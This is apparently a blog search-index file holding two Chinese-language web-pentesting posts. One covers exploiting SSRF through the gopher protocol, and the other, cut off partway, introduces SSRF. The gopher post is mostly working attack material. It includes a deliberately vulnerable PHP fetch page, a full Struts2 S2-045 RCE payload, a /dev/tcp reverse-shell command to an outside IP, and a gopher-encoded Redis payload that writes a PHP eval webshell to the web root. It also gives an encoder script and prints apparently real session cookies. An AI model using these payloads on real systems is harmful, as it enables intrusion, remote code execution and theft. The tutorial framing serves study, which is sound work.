<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Gopher</title>
      <link href="2021/05/19/Gopher/"/>
      <url>2021/05/19/Gopher/</url>
      
        <content type="html"><![CDATA[<h2 id="Gopher简介"><a href="#Gopher简介" class="headerlink" title="Gopher简介"></a>Gopher简介</h2><p>定义：Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。<strong>gopher协议支持发出GET、POST请求</strong>：可以先截获get请求包和post请求包，再构成符合gopher协议的请求。<strong>gopher协议是ssrf利用中最强大的协议。</strong></p><p>gopher协议是一个在http协议诞生前用来访问Internet资源的协议可以理解为http协议的前身或简化版，虽然很古老但现在很多库还支持gopher协议而且gopher协议功能很强大。它可以实现多个数据包整合发送，然后gopher服务器将多个数据包捆绑着发送到客户端，这就是它的菜单响应。比如使用一条gopher协议的curl命令就能操作mysql数据库或完成对redis的攻击等等。gopher协议使用tcp可靠连接。</p><p>限制：gopher协议在各个编程语言中的使用限制</p><table><thead><tr><th>协议</th><th>支持情况</th></tr></thead><tbody><tr><td>PHP</td><td>PHP</td></tr><tr><td>Java</td><td>小于JDK1.7</td></tr><tr><td>Curl</td><td>低版本不支持</td></tr><tr><td>Perl</td><td>支持</td></tr><tr><td>ASP.NET</td><td>小于版本3</td></tr></tbody></table><h2 id="Gopher协议"><a href="#Gopher协议" class="headerlink" title="Gopher协议"></a>Gopher协议</h2><p>协议格式</p><pre><code>gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_ + [TCP/IP数据]</code></pre><p>这里的<code>_</code>是一种数据连接格式，不一定是<code>_</code>，其他任意字符都行，例如这里以<code>1</code>作为连接字符：</p><pre><code>curl gopher://127.0.0.1:70/1test</code></pre><p>默认端口70，整个<code>&lt;gopher-path&gt;</code>部分可以省略。</p><p>发起post请求，回车换行需要使用<code>%0d%0a</code>，如果多个参数，参数之间的&amp;也需要进行URL编码。</p><p>gopher会将后面的数据部分发送给相应的端口，这些数据可以是字符串，也可以是其他的数据请求包，比如GET，POST请求，redis，mysql未授权访问等，同时数据部分必须要进行<strong>URL编码</strong>，这样gopher协议才能正确解析。</p><h2 id="发送gopher请求"><a href="#发送gopher请求" class="headerlink" title="发送gopher请求"></a>发送gopher请求</h2><pre><code>curl gopher://www.example.com/path/_[file]curl gopher://192.168.43.26:8888/_Hi%0aNewLine%0aThere</code></pre><p>使用Gopher协议发送一个请求，环境为：nc起一个监听，curl发送gopher请求</p><p><img src="/2021/05/19/Gopher/b83762f0-cf2a-4936-8b85-51a32661152e.png"></p><h2 id="gopher发送GET请求"><a href="#gopher发送GET请求" class="headerlink" title="gopher发送GET请求"></a>gopher发送GET请求</h2><p>在gopher协议中发送HTTP的数据，需要以下三步：</p><blockquote><p>1、构造HTTP数据包<br>2、URL编码、替换回车换行为%0d%0a<br>3、发送gopher协议</p></blockquote><pre><code>GET / HTTP/1.1Host: baidu.comUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9Cookie: BAIDUID=AEC95A01B732C2DED98755D470DEE40D:FG=1; BDUSS=1RYVDRKODZ2cWczNEpFTWhlVWJJTmlUeUlGdEZsQnZYS0trUlBxa2FDVEVubzVnRVFBQUFBJCQAAAAAAAAAAAEAAABlgi8TcXE3NDE0NzQ1OTYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMQRZ2DEEWdgSConnection: close</code></pre><p>URL全编码1次HTTP请求包，最后要加%0d%0a</p><p><img src="/2021/05/19/Gopher/513b8fcc-85a3-4ef0-b0fa-bc80f1f4070b.jpg"></p><pre><code>%47%45%54%20%2f%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%62%61%69%64%75%2e%63%6f%6d%0d%0a%55%70%67%72%61%64%65%2d%49%6e%73%65%63%75%72%65%2d%52%65%71%75%65%73%74%73%3a%20%31%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%4d%6f%7a%69%6c%6c%61%2f%35%2e%30%20%28%57%69%6e%64%6f%77%73%20%4e%54%20%31%30%2e%30%3b%20%57%69%6e%36%34%3b%20%78%36%34%29%20%41%70%70%6c%65%57%65%62%4b%69%74%2f%35%33%37%2e%33%36%20%28%4b%48%54%4d%4c%2c%20%6c%69%6b%65%20%47%65%63%6b%6f%29%20%43%68%72%6f%6d%65%2f%38%39%2e%30%2e%34%33%38%39%2e%39%30%20%53%61%66%61%72%69%2f%35%33%37%2e%33%36%0d%0a%41%63%63%65%70%74%3a%20%74%65%78%74%2f%68%74%6d%6c%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%68%74%6d%6c%2b%78%6d%6c%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%6d%6c%3b%71%3d%30%2e%39%2c%69%6d%61%67%65%2f%61%76%69%66%2c%69%6d%61%67%65%2f%77%65%62%70%2c%69%6d%61%67%65%2f%61%70%6e%67%2c%2a%2f%2a%3b%71%3d%30%2e%38%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%73%69%67%6e%65%64%2d%65%78%63%68%61%6e%67%65%3b%76%3d%62%33%3b%71%3d%30%2e%39%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%2d%4c%61%6e%67%75%61%67%65%3a%20%65%6e%2d%55%53%2c%65%6e%3b%71%3d%30%2e%39%0d%0a%43%6f%6f%6b%69%65%3a%20%42%41%49%44%55%49%44%3d%41%45%43%39%35%41%30%31%42%37%33%32%43%32%44%45%44%39%38%37%35%35%44%34%37%30%44%45%45%34%30%44%3a%46%47%3d%31%3b%20%42%44%55%53%53%3d%31%52%59%56%44%52%4b%4f%44%5a%32%63%57%63%7a%4e%45%70%46%54%57%68%6c%56%57%4a%4a%54%6d%6c%55%65%55%6c%47%64%45%5a%73%51%6e%5a%59%53%30%74%72%55%6c%42%78%61%32%46%44%56%45%56%75%62%7a%56%6e%52%56%46%42%51%55%46%42%4a%43%51%41%41%41%41%41%41%41%41%41%41%41%45%41%41%41%42%6c%67%69%38%54%63%58%45%33%4e%44%45%30%4e%7a%51%31%4f%54%59%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%4d%51%52%5a%32%44%45%45%57%64%67%53%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%0d%0a</code></pre><p>将URL全编码后的HTTP请求包的字符串附加到<code>_</code>后</p><pre><code>curl -v gopher://127.0.0.1/_%47%45%54%20%2f%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%62%61%69%64%75%2e%63%6f%6d%0d%0a%55%70%67%72%61%64%65%2d%49%6e%73%65%63%75%72%65%2d%52%65%71%75%65%73%74%73%3a%20%31%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%4d%6f%7a%69%6c%6c%61%2f%35%2e%30%20%28%57%69%6e%64%6f%77%73%20%4e%54%20%31%30%2e%30%3b%20%57%69%6e%36%34%3b%20%78%36%34%29%20%41%70%70%6c%65%57%65%62%4b%69%74%2f%35%33%37%2e%33%36%20%28%4b%48%54%4d%4c%2c%20%6c%69%6b%65%20%47%65%63%6b%6f%29%20%43%68%72%6f%6d%65%2f%38%39%2e%30%2e%34%33%38%39%2e%39%30%20%53%61%66%61%72%69%2f%35%33%37%2e%33%36%0d%0a%41%63%63%65%70%74%3a%20%74%65%78%74%2f%68%74%6d%6c%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%68%74%6d%6c%2b%78%6d%6c%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%6d%6c%3b%71%3d%30%2e%39%2c%69%6d%61%67%65%2f%61%76%69%66%2c%69%6d%61%67%65%2f%77%65%62%70%2c%69%6d%61%67%65%2f%61%70%6e%67%2c%2a%2f%2a%3b%71%3d%30%2e%38%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%73%69%67%6e%65%64%2d%65%78%63%68%61%6e%67%65%3b%76%3d%62%33%3b%71%3d%30%2e%39%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%2d%4c%61%6e%67%75%61%67%65%3a%20%65%6e%2d%55%53%2c%65%6e%3b%71%3d%30%2e%39%0d%0a%43%6f%6f%6b%69%65%3a%20%42%41%49%44%55%49%44%3d%41%45%43%39%35%41%30%31%42%37%33%32%43%32%44%45%44%39%38%37%35%35%44%34%37%30%44%45%45%34%30%44%3a%46%47%3d%31%3b%20%42%44%55%53%53%3d%31%52%59%56%44%52%4b%4f%44%5a%32%63%57%63%7a%4e%45%70%46%54%57%68%6c%56%57%4a%4a%54%6d%6c%55%65%55%6c%47%64%45%5a%73%51%6e%5a%59%53%30%74%72%55%6c%42%78%61%32%46%44%56%45%56%75%62%7a%56%6e%52%56%46%42%51%55%46%42%4a%43%51%41%41%41%41%41%41%41%41%41%41%41%45%41%41%41%42%6c%67%69%38%54%63%58%45%33%4e%44%45%30%4e%7a%51%31%4f%54%59%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%4d%51%52%5a%32%44%45%45%57%64%67%53%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%0d%0a</code></pre><pre><code>$nc -lvv 70GET / HTTP/1.1Host: baidu.comUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9Cookie: BAIDUID=AEC95A01B732C2DED98755D470DEE40D:FG=1; BDUSS=1RYVDRKODZ2cWczNEpFTWhlVWJJTmlUeUlGdEZsQnZYS0trUlBxa2FDVEVubzVnRVFBQUFBJCQAAAAAAAAAAAEAAABlgi8TcXE3NDE0NzQ1OTYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMQRZ2DEEWdgSConnection: close</code></pre><p><img src="/2021/05/19/Gopher/81845c62-fa41-4c71-acc3-ff45b673dd98.png"></p><p>服务器本地访问，这也就解释了当服务器在存在ssrf漏洞的时候(服务器请求伪造漏洞)，可以通过gopher协议访问内网或者直接刺穿内网(通过存在未授权访问的redis，mysql等)。</p><p>** 在转换为URL编码时候有这么几个坑 **</p><blockquote><p>1、问号（？）需要转码为URL编码，也就是%3f<br>2、回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a<br>3、在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）</p></blockquote><h2 id="发送POST请求"><a href="#发送POST请求" class="headerlink" title="发送POST请求"></a>发送POST请求</h2><p><strong>必须参数<code>POST</code>、<code>Host</code>、<code>Content-Type</code>、<code>Content-Length</code></strong></p><pre><code>POST /v1/pages HTTP/2Host: content-autofill.googleapis.comX-Goog-Encode-Response-If-Executable: base64X-Goog-Api-Key: dummytokenX-Client-Data: COrfygE=Sec-Fetch-Site: noneSec-Fetch-Mode: no-corsSec-Fetch-Dest: emptyUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 9alt=proto</code></pre><ol><li><p> URL全编码HTTP请求包</p></li><li><p> 将URL全编码后的HTTP请求包的字符串附加到<code>_</code>后</p></li></ol><pre><code>curl -v gopher://127.0.0.1/_%50%4f%53%54%20%2f%76%31%2f%70%61%67%65%73%20%48%54%54%50%2f%32%0d%0a%48%6f%73%74%3a%20%63%6f%6e%74%65%6e%74%2d%61%75%74%6f%66%69%6c%6c%2e%67%6f%6f%67%6c%65%61%70%69%73%2e%63%6f%6d%0d%0a%58%2d%47%6f%6f%67%2d%45%6e%63%6f%64%65%2d%52%65%73%70%6f%6e%73%65%2d%49%66%2d%45%78%65%63%75%74%61%62%6c%65%3a%20%62%61%73%65%36%34%0d%0a%58%2d%47%6f%6f%67%2d%41%70%69%2d%4b%65%79%3a%20%64%75%6d%6d%79%74%6f%6b%65%6e%0d%0a%58%2d%43%6c%69%65%6e%74%2d%44%61%74%61%3a%20%43%4f%72%66%79%67%45%3d%0d%0a%53%65%63%2d%46%65%74%63%68%2d%53%69%74%65%3a%20%6e%6f%6e%65%0d%0a%53%65%63%2d%46%65%74%63%68%2d%4d%6f%64%65%3a%20%6e%6f%2d%63%6f%72%73%0d%0a%53%65%63%2d%46%65%74%63%68%2d%44%65%73%74%3a%20%65%6d%70%74%79%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%4d%6f%7a%69%6c%6c%61%2f%35%2e%30%20%28%57%69%6e%64%6f%77%73%20%4e%54%20%31%30%2e%30%3b%20%57%69%6e%36%34%3b%20%78%36%34%29%20%41%70%70%6c%65%57%65%62%4b%69%74%2f%35%33%37%2e%33%36%20%28%4b%48%54%4d%4c%2c%20%6c%69%6b%65%20%47%65%63%6b%6f%29%20%43%68%72%6f%6d%65%2f%38%39%2e%30%2e%34%33%38%39%2e%39%30%20%53%61%66%61%72%69%2f%35%33%37%2e%33%36%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%2d%4c%61%6e%67%75%61%67%65%3a%20%65%6e%2d%55%53%2c%65%6e%3b%71%3d%30%2e%39%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%39%0d%0a%0d%0a%61%6c%74%3d%70%72%6f%74%6f</code></pre><pre><code>$nc -lvv 70POST /v1/pages HTTP/2Host: content-autofill.googleapis.comX-Goog-Encode-Response-If-Executable: base64X-Goog-Api-Key: dummytokenX-Client-Data: COrfygE=Sec-Fetch-Site: noneSec-Fetch-Mode: no-corsSec-Fetch-Dest: emptyUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 9alt=proto</code></pre><h2 id="gopher协议在ssrf中的利用"><a href="#gopher协议在ssrf中的利用" class="headerlink" title="gopher协议在ssrf中的利用"></a>gopher协议在ssrf中的利用</h2><p>出现ssrf 的地方如果没有对协议、ip、端口等一些东西进行限制，则可以用来探测内网存活的ip及开放的端口、读取任意文件、利用phar协议触发反序列化、攻击内网redis/memcache/mysql及web应用fastcgi或其他服务等等。而gopher协议在其中占了很重要的角色。</p><h3 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h3><p>我们先准备了一个带有ssrf漏洞的页面，代码如下：</p><pre><code>&lt;?php$url = $_GET[&#39;url&#39;];$curlobj = curl_init($url);curl_setopt($curlobj, CURLOPT_HEADER, 0);curl_exec($curlobj);?&gt;</code></pre><h3 id="攻击内网web-服务"><a href="#攻击内网web-服务" class="headerlink" title="攻击内网web 服务"></a>攻击内网web 服务</h3><p>当通过ssrf发现内网存在着一些比较脆弱的web服务，比如有存在struts2漏洞的web服务，就可以尝试使用gopher协议把poc发送过去实现rce，比如下面复现的这个内网struts2 s2-045漏洞就是通过gopher协议提交位于header内的poc来完成rce。<br>实验中存在ssrf 漏洞的靶机是192.168.73.150，存在struts2 s2-045漏洞的内网靶机是192.168.123.155（同一内网）。<br>通常的s2-045的poc如下</p><pre><code>GET /showcase.action HTTP/1.1Host: 192.168.123.155:8080Content-Type:%&#123;(#_=&#39;multipart/form-data&#39;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#39;id&#39;).(#iswin=(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds=(#iswin?&#123;&#39;cmd.exe&#39;,&#39;/c&#39;,#cmd&#125;:&#123;&#39;/bin/bash&#39;,&#39;-c&#39;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;</code></pre><p>对该poc的空格和一些特殊字符进行url编码，然后每个回车都编码成%0d%0a包括尾巴行的回车即可用gopher协议提交。为了方便直接把Content-Type后面的poc全部url编码了，最后结果如下。</p><p><img src="/2021/05/19/Gopher/ead3db64-4892-4d15-82c8-70bdaa869083.jpg"></p><p>需要注意的是<strong>在url中提交ssrf poc的时候得再进行一次url编码</strong>。</p><p><img src="/2021/05/19/Gopher/0f4b7e38-df63-4657-b671-88eed4ae3f8e.jpg"></p><p>这里也可以直接反弹shell，s2-045把id换成这条命令可以反弹shell</p><pre><code>exec 5&lt;&gt;/dev/tcp/192.168.123.182/7777;cat &lt;&amp;5 |while read line;do $line 2&gt;&amp;5 &gt;&amp;5;done</code></pre><p><img src="/2021/05/19/Gopher/f1735781-f773-42d2-8bf6-c4d4a29f0b06.jpg"></p><h3 id="攻击内网redis"><a href="#攻击内网redis" class="headerlink" title="攻击内网redis"></a>攻击内网redis</h3><p>这里攻击的redis 是存在密码的。<br>redis写webshell<br>这个的利用条件是知道web目录，redis启动账户有权限往web目录里写入内容。普通利用redis写webshell过程，是设置了一个key的值为shell后通过备份数据库把shell保存到web目录，操作如下。</p><pre><code># redis-cli -h 127.0.0.1 -a fooWarning: Using a password with &#39;-a&#39; or &#39;-u&#39; option on the command line interface may not be safe.127.0.0.1:6379&gt; set shell &#39;&lt;?php eval($_POST[cmd]);?&gt;&#39;OK127.0.0.1:6379&gt; config set dir &#39;/var/www/html&#39;OK127.0.0.1:6379&gt; config set dbfilename shell.phpOK127.0.0.1:6379&gt; saveOK127.0.0.1:6379&gt;&lt;/pre&gt;</code></pre><p>利用gopher协议则需要现在先在本地利用上述操作复现并抓包下来后，丢到wireshark里导出原始数据处理成gopher协议的poc，具体如下。</p><p>使用tcpdum抓包回环网卡lo的6379端口的完整包内容写入到a.cap，抓取上述redis写webshell的操作并输出原始数据。</p><pre><code>tcpdump -i lo port 6379 -s 0 -w a.cap</code></pre><p><img src="/2021/05/19/Gopher/aeb25122-394e-4d3e-87fd-908b3c898f01.png"></p><p>将a.cap 用wireshark打开找到发送redis命令的包然后追踪流，以原始数据保存到a.txt</p><p><img src="/2021/05/19/Gopher/21452323-fd60-42a0-a39b-37b5439086df.png"></p><p>使用如下命令将原始数据a.txt的内容进行编码，后使用gopher协议发送到6379端口。</p><pre><code>cat a.txt|xxd -plain|sed -r &#39;s/(..)/%\1/g&#39;|tr -d &#39;\n&#39;</code></pre><p><img src="/2021/05/19/Gopher/b84385d1-85c1-4fbf-8056-15df238dcad2.png"></p><pre><code>curl -v &#39;http://127.0.0.1/ssrf.php?url=gopher%3a//127.0.0.1%3a6379/_%2a%32%0d%0a%24%34%0d%0a%41%55%54%48%0d%0a%24%37%0d%0a%74%65%73%74%36%36%36%0d%0a%2a%31%0d%0a%24%37%0d%0a%43%4f%4d%4d%41%4e%44%0d%0a%2a%33%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%35%0d%0a%73%68%65%6c%6c%0d%0a%24%32%36%0d%0a%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%63%6d%64%5d%29%3b%3f%3e%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%33%0d%0a%64%69%72%0d%0a%24%31%33%0d%0a%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%31%30%0d%0a%64%62%66%69%6c%65%6e%61%6d%65%0d%0a%24%39%0d%0a%73%68%65%6c%6c%2e%70%68%70%0d%0a%2a%31%0d%0a%24%34%0d%0a%73%61%76%65%0d%0a&#39;</code></pre><p>也可以使用<a href="https://github.com/NickYan7/gopher_payload_generator" title="这个脚本">这个脚本</a>进行编码生成payload。</p><p><img src="/2021/05/19/Gopher/f7edcbe4-9c2e-448b-b552-698e7b340bdb.png"></p><p>除了写入webshell外还可以写ssh公钥、写crontab任务等，过程和上面类似。写ssh公钥的利用条件是redis启动用户在目标home目录下有写入权限，服务器开放了ssh且可以使用密钥登录，需要注意的是设置key值的时候要用换行<code>\n</code>隔开，不然写入了也无法解析。</p><h3 id="攻击mysql"><a href="#攻击mysql" class="headerlink" title="攻击mysql"></a>攻击mysql</h3><p>如果内网存在没有密码的mysql 则也可以使用gopher 协议进行攻击，操作过程和上面类似，在本地操作mysql 交互把数据完整抓包下来编码通过gopher 提交，在与mysql 交互的最后如果不exit gopher 会保持连接需要ctrl+c 才能显示结果。需要注意的是存在ssrf 漏洞的服务系统要和抓包时候与mysql 交互的系统要一样。</p><h3 id="攻击FastCGI"><a href="#攻击FastCGI" class="headerlink" title="攻击FastCGI"></a>攻击FastCGI</h3><h2 id="附：gopher编码脚本-主要是为了编码不可见字符和-："><a href="#附：gopher编码脚本-主要是为了编码不可见字符和-：" class="headerlink" title="附：gopher编码脚本(主要是为了编码不可见字符和)："></a>附：gopher编码脚本(主要是为了编码不可见字符和)：</h2><pre><code>#!/usr/bin/python# -*- coding:utf8 -*-import getoptimport sysimport redef togopher():    try:        opts,args = getopt.getopt(sys.argv[1:], &quot;hf:s:&quot;, [&quot;help&quot;, &quot;file=&quot;, &quot;stream=&quot;])    except:        print &quot;&quot;&quot;        Usage: python togopher.py -f &lt;filename&gt;               python togopher.py -s &lt;Byte stream&gt;               python togopher.py -h        &quot;&quot;&quot;        sys.exit()    if len(opts) == 0:        print &quot;Usage: python togopher.py -h&quot;    for opt,value in opts:        if opt in (&quot;-h&quot;, &quot;--help&quot;):            print &quot;&quot;&quot;            Usage:             -h     --help     帮助            -f     --file     数据包文件名            -s     --stream   从流量包中得到的字节流            &quot;&quot;&quot;            sys.exit()        if opt in (&quot;-f&quot;, &quot;--file&quot;):            if not value:                print &quot;Usage: python togopher.py -f &lt;filename&gt;&quot;                sys.exit()            words = &quot;&quot;            with open(value, &quot;r&quot;) as f:                for i in f.readlines():                    for j in i:                        if re.findall(r&#39;\n&#39;, j):                            words += &quot;%0d%0a&quot;                        else:                            temp = str(hex(ord(j)))                            if len(temp) == 3:                                words += &quot;%0&quot; + temp[2]                            else:                                words += &quot;%&quot; + temp[2:]            print words        if opt in (&quot;-s&quot;, &quot;--stream&quot;):            if not value:                print &quot;Usage: python togopher.py -s &lt;Bytg stream&gt;&quot;                sys.exit()            a = [value[i:i+2] for i in xrange(0, len(value), 2)]            words = &quot;%&quot; + &quot;%&quot;.join(a)            print wordsif __name__ == &quot;__main__&quot;:    togopher()</code></pre><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://xz.aliyun.com/t/6993">https://xz.aliyun.com/t/6993</a><br><a href="https://cloud.tencent.com/developer/article/1610645">https://cloud.tencent.com/developer/article/1610645</a><br><a href="https://blog.chaitin.cn/gopher-attack-surfaces/">https://blog.chaitin.cn/gopher-attack-surfaces/</a><br><a href="https://k-ring.github.io/2019/05/31/%E5%AF%B9%E4%B8%87%E9%87%91%E6%B2%B9gopher%E5%8D%8F%E8%AE%AE%E7%9A%84%E7%90%86%E8%A7%A3%E4%B8%8E%E5%BA%94%E7%94%A8/">https://k-ring.github.io/2019/05/31/%E5%AF%B9%E4%B8%87%E9%87%91%E6%B2%B9gopher%E5%8D%8F%E8%AE%AE%E7%9A%84%E7%90%86%E8%A7%A3%E4%B8%8E%E5%BA%94%E7%94%A8/</a><br><a href="https://naykcin.top/2020/06/26/ssrf-gopher/">https://naykcin.top/2020/06/26/ssrf-gopher/</a><br><a href="https://www.smi1e.top/gopher-ssrf%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E5%A4%8D%E7%8E%B0/">https://www.smi1e.top/gopher-ssrf%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E5%A4%8D%E7%8E%B0/</a></p>]]></content>
      
      
      <categories>
          
          <category> web渗透 </category>
          
          <category> SSRF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> Gopher </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF</title>
      <link href="2021/05/18/SSRF/"/>
      <url>2021/05/18/SSRF/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>SSRF（Server-Side Request Forgery，服务器端请求伪造）是一种由攻击者构造请求，利用服务器端发起请求的安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内部系统（正因为请求是由服务器端发起的，所以服务器能请求到与自身相连而外网隔离的内部系统）。能发起对外请求且URL可控的地方都有可能存在ssrf（协议地址端口内容完全可控）。</p><p>Example：</p><pre><code>GET /index.php?url=http://google.com/ HTTP/1.1Host: example.com</code></pre><p>在这里，<a href="http://example.com/">http://example.com</a> 从它的服务器获取 <a href="http://google.com/">http://google.com</a>。</p><p><img src="/2021/05/18/SSRF/81f58143-5cc0-46c8-b96a-8dec17e1785a.jpg"></p><p><img src="/2021/05/18/SSRF/7593b072-4fc3-43d2-bd64-22ebd96aee26.jpg"></p><h2 id="漏洞原因："><a href="#漏洞原因：" class="headerlink" title="漏洞原因："></a>漏洞原因：</h2><p>服务器提供从其他服务器获取数据的功能，且没有对没有对协议、ip、端口等进行过滤和限制。比如：从指定URL地址获取网页文本内容，加载指定地址的图片，下载等。利用的就是服务端的请求伪造。ssrf是利用<code>存在缺陷的web应用作为代理</code>攻击远程和本地的服务器。</p><h2 id="SSRF的类型"><a href="#SSRF的类型" class="headerlink" title="SSRF的类型"></a>SSRF的类型</h2><ol><li>有回显：显示攻击者的响应（Basic）</li><li>无回显：不显示响应（Blind）</li></ol><h2 id="容易出现SSRF的地方"><a href="#容易出现SSRF的地方" class="headerlink" title="容易出现SSRF的地方"></a>容易出现SSRF的地方</h2><ul><li>转码服务</li><li>在线翻译</li><li>云服务器商。(各种网站数据库操作)</li><li>有远程图片加载的地方。(编辑器之类的有远程图片加载)</li><li>网站采集、网页抓取的地方。(很多网站会有新闻采集输入url然后一键采集)</li><li>头像的地方。(某易就喜欢远程加载头像，例如:<a href="http://www.xxxx.com/image?url=http://www.image.com/1.jpg">http://www.xxxx.com/image?url=http://www.image.com/1.jpg</a>)</li><li>图片、文章收藏功能。</li><li>最后一个一切要你输入网址的地方和可以输入ip的地方，都是ssrf的天下。</li><li>从URL关键字中寻找：<code>share</code>、<code>wap</code>、<code>url</code>、<code>link</code>、<code>src</code>、<code>source</code>、<code>target</code>、<code>u</code>、<code>3g</code>、<code>display</code>、<code>sourceURl</code>、<code>imageURL</code>、<code>domain</code></li></ul><h2 id="漏洞的危害"><a href="#漏洞的危害" class="headerlink" title="漏洞的危害"></a>漏洞的危害</h2><ul><li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的[banner 信息]</li><li>攻击运行在内网或者本地的应用程序</li><li>对内网WEB应用进行指纹识别，通过访问默认文件实现（Readme等文件）</li><li>攻击内外网的WEB应用，主要是GET就可以实现的攻击（比如Struts2，SQL注入等）</li><li>下载内网资源（利用file协议读取本地文件等）</li><li>利用Redis未授权访问，HTTP CRLF注入达到getshell</li><li>进行跳板</li><li>无视cdn</li><li>wooyun峰会猪猪侠的ppt</li></ul><h2 id="判断SSRF漏洞"><a href="#判断SSRF漏洞" class="headerlink" 